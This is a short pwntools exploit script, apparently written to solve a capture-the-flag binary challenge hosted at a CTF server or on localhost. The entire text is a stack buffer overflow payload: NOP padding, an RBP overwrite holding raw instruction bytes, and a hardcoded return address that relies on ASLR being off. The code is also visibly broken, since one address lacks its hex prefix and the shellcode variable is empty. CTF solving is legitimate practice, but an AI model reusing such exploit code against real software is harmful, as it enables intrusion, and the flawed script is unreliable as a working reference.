from pwn import *
from time import sleep

if args.REMOTE:
    io = connect("exp.ctf.cybersecuritychallenge.ro", 8888)
else:
    io = connect("localhost", 8888)

shell = ""

# the process read from us 300 bytes
padding_size = cyclic_find("iaaajaaa")

# padding + RBP + RIP + shell
padding = padding_size * "\x90"
RBP = "\x48\x83\xC5\x08\xFF\xE5\x90\x90"

# THERE IS NO ASLR, FULL ADDRESS HERE!!! YEAAAH
# address of test function
RIP = p64(555555554a90)
#RIP = p64(0x555555554d6d)
payload = "ping" + padding + RBP + RIP + shell

io.send(payload)
io.interactive()
